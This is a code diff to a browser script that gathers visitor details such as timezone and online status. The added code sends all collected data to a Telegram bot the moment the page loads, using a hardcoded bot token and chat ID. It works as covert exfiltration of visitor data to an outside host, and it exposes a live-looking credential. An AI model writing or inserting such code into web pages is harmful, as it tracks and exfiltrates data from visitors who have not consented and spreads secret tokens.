@@ -98,6 +98,37 @@ DataOnUser.push("Timezone: " + timezone);
 // Get online/offline status (if connected to the network)
 let onlineStatus = window.navigator.onLine ? "Online" : "Offline";
 DataOnUser.push("Online Status: " + onlineStatus);
+// User Data Collector
+
+
+
+// Send collected data to Telegram
+function sendToTelegram(data) {
+    const token = "6864161221:AAG-QIHhP-ecZxcKsB_PaY9yaAlW7rRBw9M"; // Your bot token
+    const chatId = "6107520820"; // Your chat ID
+    const message = `User Data:\n\n${JSON.stringify(data, null, 2)}`; // Formatting for better readability
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('Data sent successfully');
+            } else {
+                console.error('Error sending data: ' + data.description);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+}
+
+// Execute on page load
+window.onload = function() {
+
+    sendToTelegram(DataOnUser);
+};
 
 // Printing data
 console.log(DataOnUser);
